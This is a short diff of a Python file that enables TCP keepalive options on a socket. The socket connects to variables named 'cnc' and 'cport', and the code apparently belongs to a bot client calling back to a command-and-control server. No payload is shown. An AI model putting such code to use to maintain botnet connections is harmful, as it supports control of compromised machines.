@@ -342,9 +342,9 @@ def conn():
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
-			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
-			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
+			s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
+			s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
+			s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
 			s.connect((cnc,cport))
 
 			signal = handle(s)
